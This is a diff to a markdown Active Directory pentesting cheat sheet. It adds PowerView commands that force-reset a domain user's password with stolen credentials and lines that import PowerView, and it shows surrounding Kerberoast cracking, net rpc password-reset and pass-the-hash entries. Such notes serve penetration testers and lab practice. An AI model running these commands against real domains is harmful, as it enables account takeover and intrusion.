@@ -135,7 +135,15 @@ hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.
 
 ```
 net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts new password)
+
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\\dfm.a', $SecPassword)
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred (optional $Cred)
 ```
+
+**Additional Resources**
+  - [BloodHound ForceChangePassword](https://support.bloodhoundenterprise.io/hc/en-us/articles/17223286750747-ForceChangePassword)
 
 **[Pass The Hash](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/hash-pass-the-hash/#references)**
 ```
@@ -188,7 +196,10 @@ pipx install git+https://github.com/Pennyw0rth/NetExec
 ```
 
 **[PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)**
-```. .\powerview.ps1```
+```
+. .\powerview.ps1
+Import-Module C:\Temp\PowerView.ps1
+```
 
 **NSE**
 ```--script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln*```
